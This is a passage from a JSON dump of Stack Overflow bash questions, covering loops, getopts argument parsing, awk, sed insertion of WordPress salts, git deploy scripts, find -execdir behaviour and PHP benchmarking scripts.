english!</p>\n"},{"tags":["bash","equals","zero"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13086109,"title":"bash scripting - check if bash variable equals 0","body":"<p>I have a bash variable depth and I would like to test if it equals 0. In case yes, I want to stop executing of script. So far I have:</p>\n\n<pre><code>zero=0;\n\nif [ $depth -eq $zero ]; then\n    echo \"false\";\n    exit;\nfi\n</code></pre>\n\n<p>Unfortunately, this leads to:</p>\n\n<pre><code> [: -eq: unary operator expected\n</code></pre>\n\n<p>(might be a bit inaccurate due to translation)</p>\n\n<p>Please, how can I modify my script to get it working?</p>\n\n<p>Thanks.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13085253,"title":"Writing a for loop in bash using a variable","body":"<p>I want to create a for loop in bash that runs from 1 to a number sotred in a variable in bash. I have tried doing what the answer to <a href=\"http://stackoverflow.com/questions/9778741/writing-a-bash-for-loop-with-a-variable-top-end\">this</a> question tells, but it produces this error:</p>\n\n<pre><code>Syntax error: Bad for loop variable\n</code></pre>\n\n<p>My OS is Ubuntu 12.04 and the code looks like this:</p>\n\n<pre><code>#!/bin/bash\nTOP=10\nfor ((i=1; i&lt;=$TOP; i++))\ndo\n    echo $i\ndone\n</code></pre>\n\n<p>What does this error message mean? Here is an output image:</p>\n\n<p><img src=\"http://i.stack.imgur.com/JE4DC.png\" alt=\"enter image description here\"></p>\n"},{"tags":["bash","loops","while-loop","stop"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":115,"score":-1,"question_id":12543628,"title":"bash script stops execution in while loop - why?","body":"<p>I have this bash script for converting .mp4 video to .mp3 audio.\nIt runs, but does the loop only once, though there are more mp4 files in /home/myname/mp4dir. The script converts the first .mp4 file it finds to .mp3, unless there is already an .mp3 file. This should be done in a loop, but after the first call to ffmpeg the script stops. \nWhy?</p>\n\n<pre><code>#!/bin/bash\nfind /home/myname/mp4dir -name \"*.mp4\" | while read f\ndo\n        fOut=`echo $f | sed s/mp4/mp3/`\n        echo \"convert $f =&gt; $fOut\"\n        if ! test -f $fOut\n        then\n                ffmpeg -i $f -vn -f mp3 $fOut\n        fi\ndone\n</code></pre>\n"},{"tags":["linux","bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13084805,"title":"BASH Loop run commands simultaneously","body":"<p>I have created a script which reads the number of HDD's attached then runs a speed test on them using HDDParm</p>\n\n<pre><code>for i in `seq -s' ' $from $hddcount`\ndo\n    # read and cache read speed test\n    sudo hdparm -tT ${hd[$i]} &gt;&gt; /var/www/HDD_Test/Logs/Current/Bay$i/`basename ${hd[$i]}`_speed_test.txt\ndone\n</code></pre>\n\n<p>This works fine but it runs the test one by one which is ok for the speed test to get a true figure, but I now want to run a short SMART check using smartctl. </p>\n\n<p>I want it to run simultaneously on all the HDD's attached, not one at a time. Anyone have any ideas or pointers on how to do this? Would it be a simple case of running them in the background with the &amp; notation? </p>\n"},{"tags":["git","bash","github"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13075570,"title":"git github publish to website, but do not erase a folder?","body":"<p>I am pulling from Github to our webserver for our site. All actions are done via bash scripts and scalr. In our website, one of the folders is a NFS mount to a S3 folder. Is there a way I can do a pull without killing that folder and having to remount it?\nThis is my current script:</p>\n\n<pre><code>## Git Clone -------------------------------------------------------------------\n\nif [ -d \"$DEPLOY_PATH\"/.git ]; then\n    cd \"$DEPLOY_PATH\"\n    if $GIT_PATH status &gt;/dev/null 2&gt;&amp;1; then\n       $GIT_PATH pull\n       exit 0\n    fi\nfi\n\n$GIT_PATH clone $GIT_REPO_URL $GIT_CL_DIR  .\n\n## Git Checkout ----------------------------------------------------------------\n# There should be *no* changes to the pristine repo.\necho \"Ensure pristine copy. Executing 'git reset --hard'.\"\n$GIT_PATH reset --hard HEAD 2&gt;/dev/null\n\necho \"Pulling updates from $GIT_REMOTE\"\n$GIT_PATH fetch $GIT_REMOTE\n\ncurrent_branch=$($GIT_PATH branch | awk '/\\* /{print $2}')\n\nif [[ \"$current_branch\" = \"$GIT_BRANCH\" ]] then\n    echo \"Already on branch '$GIT_BRANCH'.\"\nelif ! $GIT_PATH branch | awk \"/$GIT_BRANCH$/\" &gt;/dev/null 2&gt;&amp;1 then\n    echo \"Checkout of branch '$GIT_BRANCH'\"\n    $GIT_PATH checkout -b $GIT_BRANCH --track $GIT_REMOTE/$GIT_BRANCH 2&gt;/dev/null\n\nelif ! $GIT_PATH checkout $GIT_BRANCH 2&gt;/dev/null then\n    echo \"Branch '$GIT_REMOTE/$GIT_BRANCH' not found. Skipping remainder of update.\" 1&gt;&amp;2\n    exit 1\nfi\n\n# Run our git commands\n$GIT_PATH pull\n\n## Get submodules, if exist.\nif [ -e \".gitmodules\" ]\nthen\n    echo \"Updating submodules.\"\n    $GIT_PATH submodule init 2&gt;/dev/null\n    $GIT_PATH submodule update\nfi\n</code></pre>\n\n<p>Then I do the mounting of folders and such....</p>\n"}]}
{"total":16352,"page":6,"pagesize":100,"questions":[{"tags":["osx","bash","unix","tilde"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":2,"view_count":612,"score":-2,"question_id":9068470,"title":"Tilde not recognized in Mac terminal","body":"<p>I have this weird situation on my Mac running OSX Lion where the ~ (tilda) does not go to my user directory. Instead when I type \"cd ˜\", I get:</p>\n\n<pre><code>-bash: cd: ˜: No such file or directory\n</code></pre>\n\n<p>Any advice on how to fix this?</p>\n"},{"tags":["linux","bash","shell","unix","process"],"answer_count":8,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":4306,"score":3,"question_id":9117507,"title":"Linux/Unix command to determine if process is running?","body":"<p>I need a platform independent (Linux/Unix|OSX) shell/bash command that will determine if a specific process is running. e.g. <code>mysqld</code>, <code>httpd</code>...\nWhat is the simplest way/command to do this?</p>\n"},{"tags":["linux","apache","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13080294,"title":"grepping data Apache access.log","body":"<p>I want to have a real-time copy of /var/log/apache2/access.log so i can grep, do hostname resolution, etc.</p>\n\n<p>What's the best way to do this?</p>\n\n<p>I am curious to see what kind of traffic is passing by</p>\n"},{"tags":["bash","scripting","script","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":13079297,"title":"Inserting multiple lines containing backslashes/special characters after a certain line in a file via sed","body":"<p>I am writing a script to try and speed up my basic Wordpress installation. It downloads the latest version, unpacks it, changes to the clients name and then updates some text in the config file. </p>\n\n<p>I am however having trouble inserting multiple lines which contains special characters using sed. The multiple lines are from the WP Secret Key Generator <a href=\"https://api.wordpress.org/secret-key/1.1/salt/\" rel=\"nofollow\">https://api.wordpress.org/secret-key/1.1/salt/</a> and they are to replace the standard </p>\n\n<pre><code>define('AUTH_KEY',         'put your unique phrase here');\ndefine('SECURE_AUTH_KEY',  'put your unique phrase here');\ndefine('LOGGED_IN_KEY',    'put your unique phrase here');\n</code></pre>\n\n<p>etc...</p>\n\n<p>Here is the bit of code that is giving me the issue</p>\n\n<pre><code># Download data to variable\nsalt=\"`curl https://api.wordpress.org/secret-key/1.1/salt/`\"\n\nsed -i \"/NONCE_SALT/a $salt\" $pname/wp-config-sample.php\n</code></pre>\n\n<p>I am downloading the generated text to a variable and then looking to insert, on a new line, after the last instance in the standard text (I will later delete all of these standard lines). It throws up an error of;</p>\n\n<pre><code>\"ed: -e expression #1, char 112: extra characters after command\" \n</code></pre>\n\n<p>When I enter a single line of standard text it is fine. If I add quotation marks around the <code>$salt</code> it just prints the literal <code>$salt</code> in the file. </p>\n\n<p>Is sed the right approach for inserting this data? Keeping in mind I need to insert after a specific point in the file? </p>\n\n<p>Any hints or tips are more than welcome. This is my first attempt at a bash script. </p>\n"},{"tags":["bash","shell","scripting","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":13078776,"title":"Using record separators in awk","body":"<p>I have </p>\n\n<pre><code>$ cat awktestf \na++\nb++\nc++\n</code></pre>\n\n<p>I am doing and I get</p>\n\n<pre><code>cat  awktestf | awk 'BEGIN { RS=\"++\" ; OFS=\"@\"; ORS=\"()\" } { print $0 } END {print \"I am done\" }'\na()\nb()\nc()\n()I am done()abc@abc:~$ \n</code></pre>\n\n<p>My question is why am I getting an extra () at the end?</p>\n\n<p>Even this does not work:</p>\n\n<pre><code>$ echo 'a++\n&gt; b++\n&gt; c++' | awk 'BEGIN { RS=\"++\" ; OFS=\"@\"; ORS=\"()\" } { print $0 } END {print \"I am done\" }'\na()\nb()\nc()\n()I am done()abc@abc:~$ \n</code></pre>\n"},{"tags":["linux","string","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13078490,"title":"Extracting version number from a filename","body":"<p>I have a file in a folder like this:</p>\n\n<blockquote>\n  <p>installer-x86_64-XXX.XX-diagnostic.run</p>\n</blockquote>\n\n<p>where XXX.XX is a version number and I need the version number only. <strong>How to do it in linux?</strong></p>\n\n<p>I have this code:</p>\n\n<pre><code>#!/bin/bash\ncurrent_ver=$(find /mnt/builds/current -name '*.run'|awk -F/ '{print $NF}')\n</code></pre>\n\n<p>So this gives me just the name of the file correctly (minus the location, which I don't want).</p>\n\n<p>But how do I only get the XXX.XX version number into a variable such as <code>$version</code></p>\n"},{"tags":["file","bash","unix","sorting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13079092,"title":"How can I combine files based on a common field?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10364455/merge-two-files-by-key-if-exists-in-the-first-file-bash-script\">merge two files by key if exists in the first file / bash script</a>  </p>\n</blockquote>\n\n\n\n<p>I am trying to think of good way to combine these two selections of text (these are example of text that is in a similar format that I would be working on), based on the number prefacing the colon. This would be done in a bash environment, I've tried thinking of ways in which I could do it using cut along with other commands, but I have not been able to come up with anything that would work.</p>\n\n<pre><code>selection 1\n1:829ede2828e9\n2:893h8ew9nediucn\n3:mdheuwe883ud8932\n\nselection 2\n1:stack\n2:over\n3:flow\n</code></pre>\n\n<p>the output would be something along the lines of</p>\n\n<pre><code>1:stack:829ede2828e9\n2:over:893h8ew9nediucn\n3:flow:mdheuwe883ud8932\n</code></pre>\n\n<p>so it would essentially be combining and matching the files based on the number prefacing the colon. This code would be used to process around 39,000 lines of text. I am stumped at this point in time so I would really appreciate any help I can get, thanks! also forgot to mention the numbers wont be consistent (1,3,4,5,9,11,22 for example), although both files/sets of text will have the same set of numbers.</p>\n"},{"tags":["bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13078639,"title":"How to keep bash function parameters from being expanded","body":"<p>I have a bash function like the following:</p>\n\n<pre><code>foo() {\n    echo $1\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>bar() {\n    baz $1\n}\n</code></pre>\n\n<p>If I then call <code>foo 'file[1-3]'</code> the result is <code>file1 file2 file3</code>, not <code>file[1-3]</code>. Analogous phenomenon happens when passing the parameter to a call of another bash function like in the function <code>bar</code>. What's the easiest way around this besides ensuring that there are no matching files in the current directory so that I can reference the parameter when echoing or passing the parameter to another function?</p>\n\n<p>EDIT: String matching doesn't seem to expand the glob. My specific problem manifested when performing a string match in the internal call to another function. It was the call to the other function that appears to have expanded the pattern.</p>\n"},{"tags":["bash","script","terminal"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":13078214,"title":"Get hard drive model name with bash","body":"<p>I want to get the various model names of my hard drives using bash.</p>\n\n<p>I can do it if there's just one, using hwinfo like this:</p>\n\n<pre><code>hwinfo --ide|grep Model|sed -ne '/Model/s/.*Model: \"\\([^\"]*\\)\".*/\\1/p'\n</code></pre>\n\n<p>But this obviously fails when there's more than one. One regular hwinfo output when there are several hard drives is this:</p>\n\n<pre><code>[faidoc@Delorean ~]$ hwinfo --ide\n11: IDE 200.0: 10600 Disk                                       \n  [Created at block.245]\n  Unique ID: 3OOL.XFCtBh10jZ2\n  Parent ID: qnJ_.3_X41NtKT36\n  SysFS ID: /class/block/sda\n  SysFS BusID: 2:0:0:0\n  SysFS Device Link: /devices/pci0000:00/0000:00:0d.0/ata3/host2/target2:0:0/2:0:0:0\n  Hardware Class: disk\n  Model: \"VBOX HARDDISK\"\n  Vendor: \"VBOX\"\n  Device: \"HARDDISK\"\n  Revision: \"1.0\"\n  Serial ID: \"VBfa9b1456-03d78f51\"\n  Driver: \"ahci\", \"sd\"\n  Driver Modules: \"ahci\"\n  Device File: /dev/sda\n  Device Files: /dev/sda, /dev/disk/by-id/ata-VBOX_HARDDISK_VBfa9b1456-03d78f51\n  Device Number: block 8:0-8:15\n  BIOS id: 0x80\n  Geometry (Logical): CHS 1305/255/63\n  Size: 20971520 sectors a 512 bytes\n  Capacity: 10 GB (10737418240 bytes)\n  Config Status: cfg=new, avail=yes, need=no, active=unknown\n  Attached to: #10 (SATA controller)\n\n12: IDE 300.0: 10600 Disk\n  [Created at block.245]\n  Unique ID: WZeP.0xN7VsONW+D\n  Parent ID: qnJ_.3_X41NtKT36\n  SysFS ID: /class/block/sdb\n  SysFS BusID: 3:0:0:0\n  SysFS Device Link: /devices/pci0000:00/0000:00:0d.0/ata4/host3/target3:0:0/3:0:0:0\n  Hardware Class: disk\n  Model: \"VBOX HARDDISK\"\n  Vendor: \"VBOX\"\n  Device: \"HARDDISK\"\n  Revision: \"1.0\"\n  Serial ID: \"VB350f9911-48221ae2\"\n  Driver: \"ahci\", \"sd\"\n  Driver Modules: \"ahci\"\n  Device File: /dev/sdb\n  Device Files: /dev/sdb, /dev/disk/by-id/ata-VBOX_HARDDISK_VB350f9911-48221ae2\n  Device Number: block 8:16-8:31\n  BIOS id: 0x81\n  Geometry (Logical): CHS 2349/255/63\n  Size: 37748736 sectors a 512 bytes\n  Capacity: 18 GB (19327352832 bytes)\n  Config Status: cfg=new, avail=yes, need=no, active=unknown\n  Attached to: #10 (SATA controller)\n</code></pre>\n\n<p>Every drive begans with for example \"11:\" or \"12:\" so if I could get one at a time that will be the solution.</p>\n\n<p>Any ideas?</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","loops","while-loop","do"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13075684,"title":"Error with bash do loop - error near unexpected token 'done'","body":"<p>The following code gives me an error when I run it, I can't see where I have went wrong. </p>\n\n<p>I have looked up man as well.</p>\n\n<pre><code>while [inotifywait -m -r -e modify -e move -e create -e delete '/home/client/Files' ]; do\n    echo \"File Notification\" | mail -s \"Client File Notification\" -t \"test@test.com\"\ndone\n</code></pre>\n"},{"tags":["linux","bash","unix","scripting","curl"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1763,"score":2,"question_id":7373752,"title":"How do I get cURL to not show the progress bar?","body":"<p>I'm trying to use cURL in a script and get it to <strong><em>not</em></strong> show the progress bar, as it's just annoying output. </p>\n\n<p>I've tried the all the -s, -silent, -S, and -quiet options, but none of them work.</p>\n\n<p>Here's a typical command I've tired:</p>\n\n<pre><code>curl -s http://google.com &gt; temp.html\n</code></pre>\n\n<p>Any ideas? Cheers!!! Thanks in advance! </p>\n\n<p>EDIT:</p>\n\n<p>Also, I only get the progress bar when pushing it to a file, so <code>curl -s <a href=\"http://google.com\" rel=\"nofollow\">http://google.com</a></code> doesn't have a progress bar, but <code>curl -s <a href=\"http://google.com\" rel=\"nofollow\">http://google.com</a> &gt; temp.html</code> does.</p>\n"},{"tags":["git","bash","git-bash","git-post-receive"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12961128,"title":"catching a git post-receive error in a script","body":"<p>In a bash script I do a </p>\n\n<pre><code>git push\n</code></pre>\n\n<p>and I check its exit status.</p>\n\n<p>On the remote server there's a post-receive hook which does a few things.  If an error occurs the post-receive hook will exit with a non-zero value.</p>\n\n<p>However when the post-receive hook errors out, git push exits normally.  Unless I'm specifically checking the output for specific error strings (which I'm not) my script thinks everything went ok.  </p>\n\n<p>Is there an easy way for me to determine if the post-receive hook failed? </p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12215596,"title":"How to one-line this \"expect\" command?","body":"<p>I would like to one-line this</p>\n\n<pre><code>#!/usr/bin/expect\nspawn ssh-copy-id -i .ssh/id_dsa.pub root@testip\nexpect \"Are you sure you want to continue connecting (yes/no)?\"\nsend -- \"yes\\r\"\nexpect eof\n</code></pre>\n\n<p>which I would assume should be</p>\n\n<pre><code>/usr/bin/expect -c 'expect \"\\n\" { eval spawn ssh-copy-id -i .ssh/id_dsa.pub root@testip; expect \"Are you sure you want to continue connecting (yes/no)?\"; send -- \"yes\\r\" }'\n</code></pre>\n\n<p>but it is not.</p>\n\n<p>Can anyone see how it should be?</p>\n"},{"tags":["bash","ssh","rsync","remote-access"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":13057454,"title":"Where does rsync keep the log file for complete and incomplete data transfers?","body":"<p>I want to get the IPs of all the destination devices where my data transfer using <code>rsync</code> could not be complete (or even start) as those devices are not connected to Internet or got disconnected while data transfer ...</p>\n\n<hr>\n\n<p>My actual problem scenario is :</p>\n\n<p><strong>rsync -t Desktop/sony.pdf home@a.b.c.d:\nssh: connect to host a.b.c.d port 22: No route to host</strong></p>\n\n<p>and I want the list of all such IPs where the data transfer could not be complted ...</p>\n\n<p>the list of all IPs like 'a.b.c.d '</p>\n"},{"tags":["linux","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13073731,"title":"linux find on multiple patterns","body":"<p>I need to do a find on roughly 1500 file names and was wondering if there is a way to execute simultaneous find commands at the same time.</p>\n\n<p>Right now I do something like</p>\n\n<pre><code>for fil in $(cat my_file)\ndo\n  find . -name $fil &gt;&gt; outputfile\ndone\n</code></pre>\n\n<p>is there a way to spawn multiple instances of find  to speed up the process. Right now it takes about 7 hours to run this loop one file at a time.</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","bash","drupal","benchmarking"],"answer_count":1,"favorite_count":3,"up_vote_count":3,"down_vote_count":3,"view_count":204,"score":0,"question_id":8853692,"title":"PHP running Drupal benchmark is slower than it should be","body":"<p>Originally, I posted this on <a href=\"http://serverfault.com/questions/349456\">ServerFault</a>... but perhaps it is more of a PHP lingual question.</p>\n\n<p>I have a server with Dual Xeon Quad Core L5420 running at 2.5GHz. I've been optimizing my server, and have come to my final bottleneck: PHP.</p>\n\n<p>My very simple PHP script:</p>\n\n<p>./test.php</p>\n\n<pre><code>&lt;?php print_r(posix_getpwuid(posix_getuid()));\n</code></pre>\n\n<p>My not-so-scientific-because-they-don't-pay-attention-to-thread-locking-but-scientific-enough-to-give-me-a-reasonable-multithreaded-requests-per-second-result scripts:</p>\n\n<p>./benchmark-php</p>\n\n<pre><code>#!/bin/bash\nif [ -z $1 ]; then\n  LIMIT=10\nelse\n  LIMIT=$1\nfi\n\nif [ -z $2 ]; then\n  SCRIPT=\"index.php\"\nelse\n  SCRIPT=$2\nfi\n\nSTART=$(date +%s.%N)\nCOUNT=0\nwhile (( $COUNT &lt; $LIMIT ))\ndo\n  php $SCRIPT &gt; /dev/null\n  COUNT=$(echo \"$COUNT + 1\" | bc)\ndone\nEND=$(date +%s.%N)\nDIFF=$(echo \"$END - $START\" | bc)\nREQS_PER_SEC=$(echo \"scale=2; $COUNT / $DIFF\" | bc)\necho $REQS_PER_SEC\n</code></pre>\n\n<p>./really-benchmark-php</p>\n\n<pre><code>#!/bin/bash\nif [ -z $1 ]; then\n  LIMIT=10\nelse\n  LIMIT=$1\nfi\n\nif [ -z $2 ]; then\n  THREADS=16\nelse\n  THREADS=$2\nfi\n\nif [ -z $3 ]; then\n  SCRIPT=\"index.php\"\nelse\n  SCRIPT=$3\nfi\n\nPIDS=\"\"\n\necho '' &gt; results\nfor thread in `seq 1 $THREADS`; do\n  ./benchmark-php $LIMIT $SCRIPT &gt;&gt; results &amp;\n  PIDS=\"$PIDS $!\"\ndone\n\nfor PID in $PIDS; do\n  wait $PID\ndone\n\nRESULTS=`cat results`\nMATH=\"0\"\nfor RESULT in $RESULTS; do\n  MATH=\"$MATH + $RESULT\"\ndone\n\necho \"$MATH\" | bc\n</code></pre>\n\n<p>The result of running <code>./really-benchmark-php 100 8 test.php</code> is ~137 requests per second.</p>\n\n<p>Running the same script on a sqlite or mysql powered instance of Drupal returns ~1.5 req/s.</p>\n\n<p>I have APC and mem_cache both installed, and I have verified that they're running on defaults. (Yes, APC's enable_cli is on, also.) Does someone know the magic \"make PHP execute faster\" switch?</p>\n\n<p>I have an alternative configuration setup (FPM/FastCGI) that serves ~140 req/s of the MySQL Drupal install... how could that be possible if PHP itself can't even serve 2 req/s from the command line?</p>\n\n<p>The result of the <code>ab</code> tool feel just as low to me:</p>\n\n<p>static page: <code>ab -n 1000 -c 100 http://x.x.x.x/</code> Requests per second: 683.71</p>\n\n<p>test php: <code>ab -n 100 -c 5 http://x.x.x.x/</code> Requests per second: 41.38</p>\n\n<p>drupal-mysql: <code>ab -n 100 -c 10 http://x.x.x.x/drupal/</code> Requests per second: 0.24</p>\n\n<p>drupal-sqlite: <code>ab -n 100 -c 10 http://x.x.x.x/drupal-test/</code> Requests per second: 4.92</p>\n"},{"tags":["linux","bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13073658,"title":"Difficulty in parsing the input arguments","body":"<p>The input to my shell should follow the following signature.</p>\n\n<p>myscript.sh var1 var2 [-o var3] [-r var4].</p>\n\n<p>The -o and -r are optional inputs and these options can occur at any location (between var1 &amp; var 2 or at the start/end) but var3 will always preceed var4 if var 3 is specified. Also var1 will preceed var 2.</p>\n\n<pre><code>#!/bin/bash\n\ncase \"$#\" in\n([01]) echo \"Usage: $0 var1 var2 [-o val3] [-r val4]\" &gt;&amp;2; exit 1;;\nesac\n\nVAR1=\"$1\"\nVAR2=\"$2\" \nVAR3=\nVAR4=\n\n\nwhile getopts \":o:r:\" opt; do\n  case $opt in\n    o)\n     VAR3=$OPTARG\n      ;;\n    r)\n     VAR4=$OPTARG \n      ;;\n    \\?)\n      echo \"Invalid option: -$OPTARG\" &gt;&amp;2\n      exit 1\n      ;;\n    :)\n      echo \"Option -$OPTARG requires an argument.\" &gt;&amp;2\n      exit 1\n      ;;\n  esac\ndone\n\nshift $(( OPTIND - 1 ))\n\n\n    if [ -z \"${VAR3+xxx}\" ] &amp;&amp; [ -z \"${VAR4+xxx}\" ];\n    then\n    echo $1 $2;\n    elif [ -z \"${VAR3+xxx}\" ]; \n    then\n    echo $1 $2 $VAR4;\n    elif [ -z \"${VAR4+xxx}\" ];\n    then \n    echo $1 $2 $VAR3;\n    else\n    echo $1 $2 $VAR3 $VAR4;\n    fi\n</code></pre>\n\n<p><strong>How to handle the case where the optional arguments are inbetwen var1 &amp; var2</strong></p>\n"},{"tags":["linux","bash","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13070998,"title":"Better way of parsing the input","body":"<p>My shell script takes in a set of input variables some are optional. The input should follow the following signature. </p>\n\n<p>myscript.sh var1 var2 [-x var3] [-y var4]`. </p>\n\n<p>The -x and -y are <strong>optional</strong> inputs and these options can occur at any location (between var1 &amp; var 2 or at the start) but var3 will always preceed var4. Also var1 will preceed var 2.</p>\n\n<p>The script I have does a lot of if else checks to cover all the probabilities. \nSomething like this  </p>\n\n<pre><code>if [ $1 == \"-x\" ]; then\n## Then check if $3 == \"-y\" \n## Assign values to VAR1 , VAR2, VAR3, VAR4 \n## else check for other possibilities\nfi\n</code></pre>\n\n<p>I was wondering if there was a better way of doing this and assigning the values to variables? </p>\n"},{"tags":["c","regex","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13063725,"title":"Scripting: insert an additional #include after the last #include in many, many files","body":"<p>For a second I was hoping to get away with <code>sed</code>'s <code>a\\</code> command, but <code>sed</code> (in my hands, anyway) isn't really a fan of keeping state (inserts after every #include).</p>\n\n<p>So is there a way to do this with <code>sed</code>? Is there a <em>smart</em> way of doing this?</p>\n\n<p>I'll resort to writing a regular Python/Ruby script if that's the way to go, but this seems to be a problem someone has probably bumped into somewhere, sometime.</p>\n"},{"tags":["bash","putty","sunos"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13073145,"title":"Sun OS 5.10: Bash: Colors and Directory Listings","body":"<p>I'm on a Windows XP box.   I'm using putty 0.60 to access a unix account on a server running SunOS 5.10.  In my .profile file I have the command \"bash\" to put me into that shell upon logging in.</p>\n\n<p>I know with Linux there are options to display files and directories in different colors when I issue the command \"ls\".</p>\n\n<p>Can the same thing be set up for bash running in SunOS 5.10 ?</p>\n\n<p>Thanks much in advance for any information.</p>\n\n<p>Steve</p>\n"},{"tags":["linux","osx","bash","shell","find"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":34,"score":3,"question_id":13074060,"title":"-execdir interpretation on Linux and OSX","body":"<pre><code>find . -iname '*.rar' -execdir ls {} +\n</code></pre>\n\n<p>this will not work under OSX Lion, yielding <code>ls: blabla.rar: No such file or directory</code> etc..</p>\n\n<p>Additionally, above will work under Linux. However, it will invoke ls as many times as it find result. Tested with simple <code>cat $#</code> script.</p>\n\n<p>So I see 2 problems with <code>-execdir</code></p>\n\n<ul>\n<li>under Linux it will NOT combine search result as stated in manual when using <code>{} +</code></li>\n<li>under OSX it will NOT change directory as stated in manual, again using <code>{} +</code></li>\n</ul>\n\n<p>Wanted to confirm that this is buggy and not my misunderstanding.</p>\n"},{"tags":["linux","perl","bash","shell","awk"],"answer_count":11,"favorite_count":7,"up_vote_count":19,"down_vote_count":0,"view_count":4718,"score":19,"question_id":2702564,"title":"How can I quickly sum all numbers in a file?","body":"<p>I have a file which contains several thousand numbers, each on it's own line:</p>\n\n<pre><code>34\n42\n11\n6\n2\n99\n...\n</code></pre>\n\n<p>I'm looking to write a script which will print the sum of all numbers in the file. I've got a solution, but it's not very efficient. (It takes several minutes to run.) I'm looking for a more efficient solution. Any suggestions?</p>\n"},{"tags":["bash","loops","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":13056966,"title":"Bash Scripting: Trying to find files using ls wild-carding","body":"<p>Here's my problem: I have to resolve various filenames/locations (data directory may have sub-directories) which are user-configurable. If I can resolve the filename completely prior to the loop the following script works:</p>\n\n<pre>\n[prompt] more test.sh\n#! /usr/bin/env bash\n\nnewfile=actual-filename\n\nfor directory in `find -L ${FILE_PATH}/data -type d`; do\n    for filename in `ls -1 ${directory}/${newfile} 2>/dev/null`; do\n        if [[ -r ${filename} ]]; then\n            echo \"Found ${filename}\"\n        fi\n    done\ndone\n\n[prompt] ./test.sh\n[prompt] Found ${SOME_PATH}/actual-filename\n</pre>\n\n<p>However, if newfile has any wildcarding in it the inner-loop will not run. Even if it only returns a single file.</p>\n\n<p>I would use find with some regex, but to auto-generate the proper expressions and do the substitutions for somethings will be tricky (e.g. pgb.f0010{0930,1001}{00,06,12,18} would correlate to some files associate with Sep. 30 and Oct 1 of 2010 the first grouping is computed by my script for a provided date).</p>\n\n<pre><code>pgb.f0010093000 pgb.f0010093006 pgb.f0010093012 pgb.f0010093018 pgb.f0010100100\npgb.f0010100106 pgb.f0010100112 pgb.f0010100118 \n</code></pre>\n\n<p>I'm running Fedora 15 64-bit.</p>\n"},{"tags":["python","bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":47,"score":-3,"question_id":13072159,"title":"for loop in bash to execute many python processes in the background (&). processes eventually sleep without completing?","body":"<p>I wrote a bash script to execute many python processes via</p>\n\n<pre><code>for i in $(seq 0 20);\ndo\n    python -c \"from controller import start; start($i, $1, $2)\" &amp;\ndone\n</code></pre>\n\n<p>But eventually all the processes eventually go to sleep and do not finish. Running top -x or ps shows that the processes are still alive. </p>\n\n<p>Is there a clear reason for this? </p>\n"},{"tags":["bash","pipe","sh","background-process"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":12689369,"title":"Close pipe even if subprocesses of first command is still running in background","body":"<p>Suppose I have <code>test.sh</code> as below. The intent is to run some background task(s) by this script, that continuously updates some file. If the background task is terminated for some reason, it should be started again.</p>\n\n<pre><code>#!/bin/sh\n\nif [ -f pidfile ] &amp;&amp; kill -0 $(cat pidfile); then\n    cat somewhere\n    exit\nfi\n\nwhile true; do\n    echo \"something\" &gt;&gt; somewhere\n    sleep 1\ndone &amp;\necho $! &gt; pidfile\n</code></pre>\n\n<p>and want to call it like <code>./test.sh | otherprogram</code>, e. g. <code>./test.sh | cat</code>.</p>\n\n<p>The pipe is not being closed as the background process still exists and might produce some output. How can I tell the pipe to close at the end of <code>test.sh</code>? Is there a better way than checking for existence of <code>pidfile</code> before calling the pipe command?</p>\n\n<p>As a variant I tried using <code>#!/bin/bash</code> and 